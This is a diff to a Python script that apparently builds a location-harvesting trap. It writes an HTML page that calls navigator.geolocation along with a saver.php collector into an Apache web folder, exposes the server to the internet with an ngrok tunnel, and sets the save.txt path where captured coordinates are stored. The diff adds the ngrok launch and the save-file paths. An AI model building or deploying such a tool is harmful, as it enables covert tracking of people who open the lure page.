@@ -2,6 +2,9 @@ import os
 import sys
 import time
 
+file_dir = " "
+dir_name = " "
+
 def check_system():
     if sys.platform == "linux" or sys.platform == "linux2":
         os.system("clear")
@@ -29,7 +32,7 @@ def htmls_clientside():
                    if(navigator.geolocation)
                    {
                        navigator.geolocation.getCurrentPosition(showPosition);
-     s               }
+                    }
                     else{
                         alert("Geolocation is not supported by this browser.");
                     }
@@ -98,6 +101,7 @@ def cpaste_linux():
     return 0
 
 def cpaste_windows():
+    global dir_name, file_dir
     try:
         filename = "index.html"
         dir_name = str(input("\033[1;32m Enter htdocs Path: \033[1;m"))
@@ -115,6 +119,7 @@ def cpaste_windows():
             
             filename = "saver.php"
             write_file = dir_name + "/saver.php"
+            file_dir = dir_name + "/save.txt"
     except FileNotFoundError:
         return 1
 
@@ -132,6 +137,7 @@ def startscript():
             time.sleep(5)
             os.system("apache2 start")
             os.system("clear")
+        file_dir = "/var/www/save.txt"
         os.system("clear")
     
     elif check_system() == "win32":
@@ -140,11 +146,15 @@ def startscript():
             print("\033[1;32m move index.html and saver.php to htdocs in apache and start the apache server\033[1;m")
             time.sleep(5)
             os.system("cls")
+
+        os.system("start call ngrok http 80")
+        file_dir = dir_name + "/save.txt"
         os.system("cls")
 
 if __name__ == "__main__":
     startscript()
-    file_dir = str(input("\033[1;32m Enter Save.txt Path: \033[1;32m"))
+    #file_dir = str(input("\033[1;32m Enter Save.txt Path: \033[1;32m"))
+
     count = 0
     while count < 1:
         try:
